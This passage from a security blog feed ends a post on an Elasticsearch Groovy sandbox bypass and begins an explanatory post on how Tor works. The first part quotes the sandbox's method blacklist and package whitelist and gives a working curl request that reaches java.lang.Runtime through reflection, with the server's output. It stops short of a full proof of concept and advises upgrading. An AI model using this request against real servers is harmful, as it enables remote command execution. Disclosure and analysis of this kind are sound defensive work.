</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultMethodBlacklist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span>
</span><span class='line'>    <span class="s">&quot;getClass&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;wait&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;notify&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;notifyAll&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="s">&quot;finalize&quot;</span>
</span><span class='line'><span class="o">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok, so we can&rsquo;t use any of those. Next, we need to make sure that our method name isn&rsquo;t null, and we don&rsquo;t use a <a href="http://groovy.codehaus.org/api/org/codehaus/groovy/ast/expr/GStringExpression.html"><code>GStringExpression</code></a>. No problem.</p>

<p>There&rsquo;s one more hurdle that we have to overcome. This sandbox also restricts the packages that can have methods called on them (from <a href="https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854"><code>SecureASTCustomizer.java</code></a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">receiversWhiteList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">receiversWhiteList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">receiversBlackList</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">receiversBlackList</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">typeName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">throw</span> <span class="k">new</span> <span class="nf">SecurityException</span><span class="o">(</span><span class="s">&quot;Method calls not allowed on [&quot;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&quot;]&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The whitelist for elasticsearch is found in the variable <code>defaultReceiverWhitelist</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kd">final</span> <span class="kd">static</span> <span class="n">String</span><span class="o">[]</span> <span class="n">defaultReceiverWhitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span> <span class="o">[]</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">groovy</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">GroovyCollections</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Math</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
</span><span class='line'>    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="s">&quot;[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[I&quot;</span><span class="o">,</span> <span class="s">&quot;[[[I&quot;</span><span class="o">,</span>
</span><span class='line'>    <span class="c1">//snip</span>
</span><span class='line'><span class="o">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the surface, this eliminates our ability to call any methods on interesting packages, such as <code>java.lang.Runtime</code>, which could be used to execute system commands. However, there&rsquo;s a way we can bypass both the package whitelist and the method blacklist to execute our code. This is done through a tricky Java feature called <a href="http://docs.oracle.com/javase/tutorial/reflect/"><code>reflection</code></a>.</p>

<h3>Bypassing the Sandbox with Reflection</h3>

<p>Vulnerabilities can often be reverse-engineered by inspecting the patches since the previous release. The commit that we will look at is <a href="https://github.com/elasticsearch/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47">here</a>. The changes in this commit give us some hints about how we can exploit the vulnerability:</p>

<p><img src="http://jordan-wright.github.io/images/blog/elk/rce.png"/></p>

<p>This makes it pretty clear that we can probably do something with the <code>.class</code> and <code>.forName()</code> method calls. These methods, chained together, allow us to take one package class (such as one found in the whitelist) and use it to load a reference to a completely separate class (such as <code>java.lang.Runtime</code>) via reflection.</p>

<p>So what does this look like?</p>

<p>Let&rsquo;s see if we can load the <code>java.lang.Runtime</code> package by using reflection off of the <code>java.lang.Math</code> package, which is in the whitelist of packages we can use:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ curl http://localhost:9200/_search?pretty -XPOST -d &#39;{&quot;script_fields&quot;: {&quot;myscript&quot;: {&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;)&quot;}}}&#39;
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>  &lt;snip&gt;
</span><span class='line'>  &quot;hits&quot; : {
</span><span class='line'>    &quot;total&quot; : 8,
</span><span class='line'>    &quot;max_score&quot; : 1.0,
</span><span class='line'>    &quot;hits&quot; : [ {
</span><span class='line'>      &lt;snip&gt;
</span><span class='line'>      &quot;fields&quot; : {
</span><span class='line'>        &quot;myscript&quot; : [ &quot;class java.lang.Runtime&quot; ]
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>}}
</span></code></pre></td></tr></table></div></figure>


<p><em>Success!</em> We can see the result of our query returned an instance of the <code>java.lang.Runtime</code> class. We can use this instance to execute system commands on the server.</p>

<p>I won&rsquo;t provide a full proof-of-concept, but all the pieces are here. Using a mix of the first exploit shown above along with the way I&rsquo;ve shown to get a reference to the <code>java.lang.Runtime</code> package, it is pretty straightforward to run whatever commands you want.</p>

<h3>Conclusion</h3>

<p>This vulnerability was not heavily advertised, but it is absolutely critical. In fact, I had one of my own elasticsearch instances compromised this way, showing this vulnerability is heavily being exploited in the wild.</p>

<p>Elasticsearch recommends to only allow the software to be accessed locally, but there are a <em>ton</em> of publicly available ES instances. This is likely because the default configuration listens on <code>0.0.0.0:9200</code>.</p>

<p>If you use elasticsearch, and haven&rsquo;t upgraded to 1.4.3 (or the latest 1.4.4), I recommend upgrading <strong>immediately</strong>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><sup>1</sup> There&rsquo;s an Xzibit joke to be made here.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Tor Works: Part One]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/28/how-tor-works-part-one/"/>
    <updated>2015-02-28T18:00:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/28/how-tor-works-part-one</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/how_tor_works_1.png"/></p>

<h3>Introduction</h3>

<p>Tor is an anonymity tool used by those who want to stay private and uncensored when browsing the Internet. Over time, it&rsquo;s grown to be pretty darn good at this. This makes the security, stability, and speed of the underlying network critical to those depending on it.</p>

<p>But how does Tor work under the hood? In this series of posts, we&rsquo;ll take a deep dive into the structure and protocols used by the Tor network in order to see first-hand how Tor operates.</p>

<!--more-->


<h3>Brief History of Tor</h3>

<p>The concept of Onion Routing (more on why it&rsquo;s called this later) was first <a href="http://www.onion-router.net/History.html">proposed</a> in 1995, where it was first funded by the <a href="http://www.onr.navy.mil/">Office of Naval Research</a> (ONR) and later helped out by DARPA in 1997. Since then, funding for the Tor Project has been provided by a <a href="https://www.torproject.org/about/sponsors.html.en">number of different sponsors</a>, and the Tor Project was recently announced a winner of the <a href="http://www.redditblog.com/2015/02/announcing-winners-of-reddit-donate.html">reddit donate</a> campaign.</p>

<p>The Tor software as we know it today was originally open-sourced in October of 2003, and is the 3<sup>rd</sup> generation of Onion Routing software. This idea of Onion Routing was (and is!) simply that we can wrap traffic in encrypted layers (like <em>onions</em>) in order to protect the contents of the data as well as the anonymity of the sender and receiver.</p>

<h3>Tor 101</h3>

<p>Now that we know a bit about Tor&rsquo;s history, let&rsquo;s talk about how it works. At an <em>extremely</em> high level, Tor works by bouncing connections from your computer to destinations (such as google.com) through a series of intermediate computers, or <strong>relays</strong>.</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   width="100%"
   height="482"
   style="max-height:250px;"
   onclick="d.reset().play();"
   viewBox="0 0 748 483"
   id="earth"
   version="1.1">
  <defs
     id="defs5976" />
  <g
     inkscape:label="Layer 1"
     inkscape:groupmode="layer"
     id="layer1"
     transform="translate(-135.6,-230.9)">
    <g
       id="g6088"
       transform="matrix(9.9,0,0,9.9,135.6,230.9)"
       style="fill:#ffffff">
      <g
         id="g6036"
         style="fill:#ffffff">
    <g
   id="g6038"
   style="fill:#ffffff">
        <polygon
   id="polygon6040"
   points="35.5,9.4 34.7,9.5 34.5,9.9 34.5,10.2 34.9,10.5 35.4,10.8 35.4,11.1 34.9,11.2 34.8,12.0 35.5,12.0 36.3,11.9 36.8,11.4 36.3,11.2 36.0,10.9 35.7,10.3 "
   style="fill:#ffffff" />

        <polygon
   id="polygon6042"
   points="33.8,10.5 33.3,11.2 33.3,11.7 33.8,11.7 34.8,11.1 34.8,10.6 34.4,10.4 "
   style="fill:#ffffff" />

        <path
   id="path6044"
   d="m 22.4,13.1 -0.1,0.3 h -0.6 v 0.3 h 0.1 c 0,0 0.0,0.0 0.0,0.1 l 0.3,-0.0 0.2,-0.1 0.0,-0.3 0.3,-0.0 0.1,-0.2 -0.2,-0.0 -0.2,0.0 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

        <polygon
   id="polygon6046"
   points="20.8,13.7 20.7,14.0 21.2,14.0 21.2,13.7 21.0,13.4 "
   style="fill:#ffffff" />

        <path
   id="path6048"
   d="M 48.6,24.0 C 48.6,23.3 48.5,22.6 48.5,21.9 48.2,19.6 47.7,17.4 46.9,15.3 46.8,15.1 46.7,15.0 46.7,14.8 45.6,12.2 44.0,9.8 42.1,7.8 42.0,7.6 41.9,7.5 41.7,7.4 41.4,7.0 41.0,6.6 40.6,6.3 36.3,2.4 30.6,0 24.3,0 17.9,0 12.1,2.4 7.8,6.4 6.8,7.3 5.9,8.3 5.0,9.4 1.8,13.5 0,18.7 0,24.3 c 0,13.4 10.9,24.3 24.3,24.3 9.4,0 17.6,-5.4 21.6,-13.2 0.8,-1.6 1.5,-3.4 1.9,-5.3 0.1,-0.4 0.2,-0.9 0.3,-1.4 0.2,-1.3 0.3,-2.8 0.3,-4.2 10e-4,-0.0 -0.0,-0.1 -0.0,-0.2 z m -4.5,-9.7 0.1,-0.1 c 0.1,0.3 0.3,0.7 0.5,1.0 l -0.2,-0.0 -0.4,0.0 V 14.3 z M 40.5,10.1 40.5,9.0 c 0.3,0.4 0.7,0.8 1.1,1.2 l -0.4,0.6 -1.5,-0.0 -0.0,-0.3 0.9,-0.4 z M 11.2,7.4 V 7.3 h 0.4 l 0.0,-0.1 h 0.7 v 0.3 l -0.2,0.3 h -1.0 l 10e-4,-0.4 0,0 z m 0.7,1.0 c 0,0 0.4,-0.0 0.5,-0.0 0.0,0 0,0.4 0,0.4 L 11.4,8.9 11.2,8.7 11.9,8.4 z m 33.6,9.6 h -1.7 l -1.0,-0.8 -1.1,0.1 v 0.6 h -0.3 l -0.3,-0.2 -1.9,-0.5 v -1.2 l -2.5,0.1 -0.7,0.4 h -0.9 l -0.4,-0.0 -1.2,0.6 v 1.2 l -2.4,1.7 0.2,0.7 h 0.5 L 31,21.8 l -0.3,0.1 -0.0,1.8 2.1,2.4 h 0.9 l 0.0,-0.1 h 1.6 l 0.4,-0.4 h 0.9 l 0.5,0.5 1.4,0.1 -0.1,1.8 1.5,2.7 -0.8,1.5 0.0,0.7 0.6,0.6 v 1.7 l 0.8,1.1 v 1.4 h 0.7 c -4.0,5.0 -10.3,8.2 -17.3,8.2 C 12.0,46.6 2,36.6 2,24.3 2,21.2 2.6,18.2 3.7,15.5 V 14.8 L 4.5,13.9 C 4.8,13.3 5.1,12.8 5.4,12.3 L 5.5,12.7 4.5,13.9 C 4.2,14.4 4.0,15.0 3.7,15.5 v 1.2 l 0.9,0.4 v 1.7 l 0.8,1.5 0.7,0.1 0.0,-0.5 -0.8,-1.3 -0.1,-1.2 h 0.5 l 0.2,1.3 1.2,1.7 -0.3,0.5 0.7,1.1 1.9,0.4 v -0.3 l 0.7,0.1 -0.0,0.5 0.6,0.1 0.9,0.2 1.3,1.5 1.7,0.1 0.1,1.3 -1.1,0.8 -0.0,1.2 -0.1,0.7 1.6,2.1 0.1,0.7 c 0,0 0.6,0.1 0.6,0.1 0.0,0 1.3,0.9 1.3,0.9 v 3.8 l 0.4,0.1 -0.3,1.7 0.7,1.0 -0.1,1.7 1.0,1.8 1.3,1.1 1.3,0.0 0.1,-0.4 -0.9,-0.8 0.0,-0.4 0.1,-0.5 0.0,-0.5 -0.6,-0.0 -0.3,-0.4 0.5,-0.5 0.0,-0.3 -0.6,-0.1 0.0,-0.3 0.8,-0.1 1.3,-0.6 0.4,-0.8 1.3,-1.7 -0.3,-1.3 0.4,-0.7 1.2,0.0 0.8,-0.6 0.2,-2.6 0.9,-1.2 0.1,-0.7 -0.8,-0.2 -0.5,-0.9 -1.9,-0.0 -1.5,-0.5 -0.0,-1.1 -0.5,-0.9 -1.4,-0.0 -0.8,-1.2 -0.7,-0.3 -0.0,0.3 -1.3,0.0 -0.4,-0.6 -1.3,-0.2 -1.1,1.3 -1.7,-0.3 -0.1,-2.0 -1.2,-0.2 0.5,-0.9 -0.1,-0.5 -1.7,1.1 -1.0,-0.1 -0.3,-0.8 0.2,-0.8 0.5,-1.0 1.3,-0.6 2.6,-0.0 -0.0,0.8 0.9,0.4 -0.0,-1.3 0.6,-0.6 1.3,-0.9 0.0,-0.6 1.3,-1.4 1.4,-0.8 -0.1,-0.1 0.9,-0.9 0.3,0.0 0.1,0.2 0.3,-0.4 0.0,-0.0 -0.4,-0.0 -0.4,-0.1 v -0.4 l 0.2,-0.1 h 0.4 l 0.2,0.0 0.1,0.3 0.2,-0.0 v -0.0 l 0.0,0.0 0.6,-0.1 0.0,-0.3 0.3,0.0 v 0.3 l -0.3,0.2 h 10e-4 l 0.0,0.3 1.2,0.3 c 0,0 10e-4,0.0 0.0,0.0 l 0.2,-0.0 0.0,-0.5 -0.9,-0.4 -0.0,-0.2 0.8,-0.2 0.0,-0.7 -0.8,-0.5 -0.0,-1.3 -1.1,0.5 h -0.4 l 0.1,-1.0 -1.5,-0.3 -0.6,0.4 v 1.5 l -1.1,0.3 -0.4,0.9 -0.5,0.0 V 10.5 L 16.9,10.3 16.3,10.0 16.1,9.2 18.1,8.0 19.0,7.7 19.1,8.4 19.7,8.3 19.7,8.0 20.3,7.9 20.3,7.8 20.1,7.7 20.0,7.4 l 0.6,-0.0 0.4,-0.4 0.0,-0.0 0.0,0.0 0.1,-0.1 1.4,-0.1 0.6,0.5 -1.6,0.9 2.1,0.5 0.2,-0.7 h 0.9 L 25.4,7.1 24.7,7.0 V 6.2 L 22.6,5.2 21.2,5.4 20.4,5.8 20.4,6.9 19.6,6.7 19.5,6.2 20.3,5.4 18.8,5.3 l -0.4,0.1 -0.1,0.5 0.5,0.0 -0.1,0.5 -0.9,0.0 -0.1,0.3 -1.3,0.0 c 0,0 -0.0,-0.7 -0.0,-0.7 -0.0,0 1.0,-0.0 1.0,-0.0 L 18.0,5.5 17.5,5.3 16.9,5.8 15.9,5.8 15.3,5.0 H 14.1 L 12.8,6.0 h 1.2 l 0.1,0.3 -0.3,0.2 1.3,0.0 0.2,0.4 L 13.8,7.1 13.7,6.7 12.8,6.5 12.3,6.2 11.2,6.2 C 14.8,3.5 19.4,2 24.3,2 c 5.6,0 10.7,2.1 14.7,5.5 l -0.2,0.4 -1.0,0.4 -0.4,0.4 0.1,0.5 0.5,0.0 0.3,0.8 0.9,-0.3 0.1,1.0 h -0.2 l -0.7,-0.1 -0.8,0.1 -0.8,1.1 -1.1,0.1 -0.1,0.9 0.4,0.1 -0.1,0.6 -1.1,-0.2 -1.0,0.2 -0.2,0.5 0.1,1.2 0.6,0.2 1.0,-0.0 0.6,-0.0 0.2,-0.5 1.0,-1.4 0.7,0.1 0.7,-0.6 0.1,0.5 1.7,1.1 -0.2,0.2 -0.7,-0.0 0.3,0.4 0.4,0.1 0.5,-0.2 -0.0,-0.6 0.2,-0.1 -0.2,-0.2 -1.1,-0.6 -0.3,-0.8 h 0.9 l 0.3,0.3 0.8,0.7 0.0,0.8 0.8,0.9 0.3,-1.2 0.5,-0.3 0.1,1.0 0.5,0.6 1.1,-0.0 c 0.2,0.5 0.4,1.1 0.6,1.7 l -0.1,0.1 z m -32.3,-7.0 0.5,-0.2 0.5,0.1 -0.1,0.7 -0.5,0.1 -0.3,-0.7 z m 3.0,1.6 v 0.4 h -1.3 l -0.5,-0.1 0.1,-0.3 0.6,-0.2 h 0.8 v 0.2 h 0.1 z m 0.6,0.6 V 13.8 l -0.3,0.2 -0.4,0.0 c 0,0 0,-0.6 0,-0.7 h 0.7 z m -0.3,-0.1 v -0.5 l 0.4,0.4 -0.4,0.1 z m 0.2,1.0 v 0.4 l -0.3,0.3 h -0.7 l 0.1,-0.4 0.3,-0.0 0.0,-0.1 0.5,-0.0 z m -1.7,-0.8 h 0.7 l -0.9,1.3 -0.3,-0.2 0.0,-0.5 0.5,-0.5 z m 3.0,0.7 v 0.4 H 17.3 l -0.1,-0.2 v -0.4 h 0.0 l 0.8,0.2 z m -0.6,-0.5 0.2,-0.2 0.3,0.2 -0.2,0.2 -0.2,-0.2 z m 28.5,5.7 0.0,-0.0 c 0.0,0.1 0.0,0.2 0.0,0.3 l -0.1,-0.2 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

        <path
   id="path6050"
   d="M 3.7,14.8 V 15.5 C 4.0,15.0 4.2,14.4 4.5,13.9 l -0.7,0.9 z"
   inkscape:connector-curvature="0"
   style="fill:#ffffff" />

    </g>

</g>
      <g
         id="g6052"
         style="fill:#ffffff">
</g>
      <g
         id="g6054"
         style="fill:#ffffff">
</g>
      <g
         id="g6056"
         style="fill:#ffffff">
</g>
      <g
         id="g6058"
         style="fill:#ffffff">
</g>
      <g
         id="g6060"
         style="fill:#ffffff">
</g>
      <g
         id="g6062"
         style="fill:#ffffff">
</g>
      <g
         id="g6064"
         style="fill:#ffffff">
</g>
      <g
         id="g6066"
         style="fill:#ffffff">
</g>
      <g
         id="g6068"
         style="fill:#ffffff">
</g>
      <g
         id="g6070"
         style="fill:#ffffff">
</g>
      <g
         id="g6072"
         style="fill:#ffffff">
</g>
      <g
         id="g6074"
         style="fill:#ffffff">
</g>
      <g
         id="g6076"
         style="fill:#ffffff">
</g>
      <g
         id="g6078"
         style="fill:#ffffff">
</g>
      <g
         id="g6080"
         style="fill:#ffffff">
</g>
    </g>
    <path
       style="fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 292.9,394.7 c 0,0 85.8,-133.3 186.8,20.2"
       id="path6115"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 479.8,414.9 c 0,0 87.8,-141.4 56.5,63.6"
       id="path6625"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 401.4,247.1 c 0,0 -142.8,-90.7 -216.4,33.5"
       id="path6627"
       inkscape:connector-curvature="0"
       transform="translate(135.6,230.9)" />
    <path
       style="fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 185.7,280.0 c 0,0 17.8,-149.2 -93.5,-107.1"
       id="path6629"
       inkscape:connector-curvature="0"
       transform="translate(135.6,230.9)" />
    <path
       style="fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.2,283.4 39.3,0"
       id="path6631"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.7,338.5 39.3,0"
       id="path6631-4"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.7,393.5 39.3,0"
       id="path6631-6"
       inkscape:connector-curvature="0" />
    <path
       style="fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
       d="m 688.7,452.1 39.3,0"
       id="path6631-0"
       inkscape:connector-curvature="0" />
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="740.7"
       y="288.3"
       id="text6740"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="740.7"
         y="288.3"
         id="tspan6742"><tspan
           x="740.7"
           y="288.3"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6744">Guard Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="743.0"
       y="344.3"
       id="text6746"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="743.0"
         y="344.3"
         id="tspan6748"><tspan
           x="743.0"
           y="344.3"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6750">Middle Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="741.4"
       y="399.8"
       id="text6752"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="741.4"
         y="399.8"
         id="tspan6754"><tspan
           x="741.4"
           y="399.8"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6756">Exit Node</tspan></tspan></text>
    <text
       xml:space="preserve"
       style="font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"
       x="742.3"
       y="458.5"
       id="text6758"
       sodipodi:linespacing="125%"><tspan
         sodipodi:role="line"
         x="742.3"
         y="458.5"
         id="tspan6760"><tspan
           x="742.3"
           y="458.5"
           style="font-weight:300;fill:#ffffff;"
           id="tspan6762">Final Destination</tspan></tspan></text>
  </g>
</svg>
</div>


<br/>


<p>Currently, there are <a href="https://metrics.torproject.org/networksize.html">about 6000 relays</a> routing traffic through the Tor network. These relays are located all across the world and run completely by volunteers willing to give up some bandwidth for the cause. It&rsquo;s important to note that most relays don&rsquo;t have special hardware or software to run. They just have the Tor software configured to act as a relay.</p>

<p>When it comes to speed and anonymity of the Tor network &ndash; the more relays, the better! This makes sense, because every relay only has so much bandwidth to offer. Additionally, if there are more relays to choose from, it will be more difficult to track any one user.</p>

<h3>Types of Relays</h3>

<p>By default, Tor bounces connections through 3 relays. Each of these have a specific role to play (we&rsquo;ll cover each in more detail in later posts):</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   width="100%"
   height="1236.6"
   id="network"
   version="1.1"
   style="max-height:300px;"
   onclick="e.reset().play(1.25);"
   viewBox="0 0 1956 1236">
  <defs
     id="defs8112" />
     <g
        inkscape:label="Layer 1"
        inkscape:groupmode="layer"
        id="layer1"
        transform="translate(885.83545,44.405879)">
       <g
          id="g8200"
          transform="matrix(0.38940404,0,0,0.37354888,832.4136,424.91373)"
          style="fill:#ffffff">
         <g
            id="g8160"
            style="fill:#ffffff">
    <path
      id="path8162"
      d="M 578.766,51.487 V 50.592 H 575.77 35.93 32.934 v 0.895 C 15.272,52.701 2.095,66.753 0,83.808 v 3.002 355.724 c 0,6.898 1.795,12.712 4.791,17.949 6.893,12.137 17.068,18.269 31.14,18.269 h 197.012 v 49.695 h -37.425 c -9.281,0 -16.467,7.218 -16.467,16.48 0,9.262 7.186,16.479 16.467,16.479 h 220.666 c 9.281,0 16.768,-7.218 16.768,-16.479 0,-9.263 -7.486,-16.48 -16.768,-16.48 H 378.759 V 478.752 H 575.77 c 14.078,0 24.343,-6.132 31.14,-18.269 3.085,-5.493 5.091,-11.37 5.091,-17.949 V 86.811 83.809 C 609.905,66.753 595.833,52.701 578.766,51.487 z m 0,35.324 v 355.724 c 0,2.108 -0.895,3.002 -2.996,3.002 H 35.93 c -2.095,0 -2.996,-0.894 -2.996,-3.002 V 86.811 83.809 h 545.831 v 3.002 z"
      inkscape:connector-curvature="0"
      style="fill:#ffffff" />

   </g>
         <g
            id="g8164"
            style="fill:#ffffff">
   </g>
         <g
            id="g8166"
            style="fill:#ffffff">
   </g>
         <g
            id="g8168"
            style="fill:#ffffff">
   </g>
         <g
            id="g8170"
            style="fill:#ffffff">
   </g>
         <g
            id="g8172"
            style="fill:#ffffff">
   </g>
         <g
            id="g8174"
            style="fill:#ffffff">
   </g>
         <g
            id="g8176"
            style="fill:#ffffff">
   </g>
         <g
            id="g8178"
            style="fill:#ffffff">
   </g>
         <g
            id="g8180"
            style="fill:#ffffff">
   </g>
         <g
            id="g8182"
            style="fill:#ffffff">
   </g>
         <g
            id="g8184"
            style="fill:#ffffff">
   </g>
         <g
            id="g8186"
            style="fill:#ffffff">
   </g>
         <g
            id="g8188"
            style="fill:#ffffff">
   </g>
         <g
            id="g8190"
            style="fill:#ffffff">
   </g>
         <g
            id="g8192"
            style="fill:#ffffff">
   </g>
       </g>
       <path
          id="path8222"
